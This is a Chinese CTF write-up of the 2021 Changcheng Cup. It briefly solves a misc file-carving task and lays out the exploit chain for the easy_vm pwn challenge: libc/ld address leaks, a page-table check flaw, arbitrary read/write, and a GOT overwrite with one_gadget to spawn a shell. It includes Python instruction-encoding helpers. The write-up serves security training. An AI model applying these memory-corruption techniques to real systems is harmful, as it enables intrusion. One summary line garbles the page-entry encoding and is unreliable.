---
title: 【WP】第一届"长城杯"网络安全大赛线上赛
contest: 长城杯
year: 2021
difficulty: hard
vuln_type: pwn_unknown
tags: [custom-VM, INFO-breakpoint-leak, mmap-0x200000+libc-ld-offset, page-table-64bit-low-16-bits, LW-SW-arbitrary-RW, one_gadget, linkmap-text-base, ROP-via-got]
attack_chain: VM 申请内存 > 0x200000 触发 mmap 固定偏移/INFO 断点泄 ld 基址 + libc 基址/PAGE 指令初始化页表利用 64 位低 16 位检查漏洞填 ld 基址到页表/LW/SW 通过页框基址+24 位偏移任意地址读写/LD_PAGE 把 text 段基址放入页表/改 puts got = one_gadget 触发 EXIT 收 shell
key_payload: page_table 64 位低 16 位检查  LW/SW 任意地址读写  one_gadget
one_liner: 第一届长城杯网络安全大赛 easy_vm 高级 PWN，自定义 VM + 64 位页表检查漏洞 + LW/SW 任意地址读写。
lesson: VM 申请内存 > 0x200000 触发 mmap 与 libc/ld 固定偏移是泄地址经典方法；64 位页表项只检查低 16 位是绕过页表检查的经典漏洞；LW + SW + 页框基址 + 24 位偏移实现任意地址读。
quality: high
---

# 【WP】第一届"长城杯"网络安全大赛线上赛

## 概览
2021 第一届长城杯网络安全大赛 4 道题精选 WP，伽玛实验室出题。

## Misc: 你这 flag 保熟吗
- 将 1.png 和 2.png 拖到 010editor 查看
- 发现 rar 文件头，另存为 rar
- 解压得到 password.xls 和 hint.txt

## Pwn: easy_vm

### 漏洞分析
- VM 申请内存时最大 0x300000
- malloc 超过 0x200000 时调 mmap，地址与 libc/ld 偏移固定
- VM 可下断点，"INFO" 类型断点打印内存地址 → 泄 libc/ld 基址
- 64 位页表项只检查低 16 位 → 页框基址可很大或很小
- LW + SW 指令 = 页框基址 + 24 位偏移 = 任意地址读写

### 漏洞利用步骤
1. 泄 ld 基址
2. PAGE 指令初始化页表，利用漏洞把 ld 基址填入页表
3. LW/SW 把 text 段基址放入寄存器
4. 算 one_gadget 地址
5. LD_PAGE 把 text 段基址放入页表
6. 利用 text 段页表项把 puts got 改成 one_gadget
7. EXIT 指令触发 puts → shell

### 自定义 VM 指令集
```python
def page():
    payload = p32(12)
    return payload

def ld_page(reg_idx, page_idx):
    opcode = 13
    tmp = opcode | (reg_idx << 6) | (page_idx << 9)
    payload = p32(tmp)
    return payload

def creat_page(addr):
    flag = 0x3ff
    tmp = addr << 10 | flag
    payload = p64(tmp)
    return payload

def LW(dest_idx, src_idx, imm):
    opcode = 0x2
    tmp = opcode | (dest_idx << 6) | (src_idx << 9) | (imm << 12)
    payload = p32(tmp)
    return payload

def PUSH(imm):
    opcode = 10
    tmp = opcode | (imm << 6)
    payload = p32(tmp)
    return payload

def POP(idx):
    opcode = 11
    tmp = opcode | (idx << 6)
    payload = p32(tmp)
    return payload

def SAL(idx_1, idx_2, dest_idx):
    opcode = 15
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload

def OR(idx_1, idx_2, dest_idx):
    opcode = 16
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload
```

## 经验提炼
- VM 申请内存 > 0x200000 触发 mmap 与 libc/ld 固定偏移是泄地址经典方法
- 64 位页表项只检查低 16 位是绕过页表检查的经典漏洞
- LW + SW + 页框基址 + 24 位偏移实现任意地址读
- linkmap 中保存 text 段基址
- one_gadget 是 libc 单 gadget 触发 execve("/bin/sh")
- INFO 断点用于 VM 调试输出
- PAGE/LD_PAGE 是自定义 VM 指令集中页表操作
- 0x3ff 是页表项标志位（10 位 flags）
- `p64(tmp) << 10 | flag` 是页表项编码方式
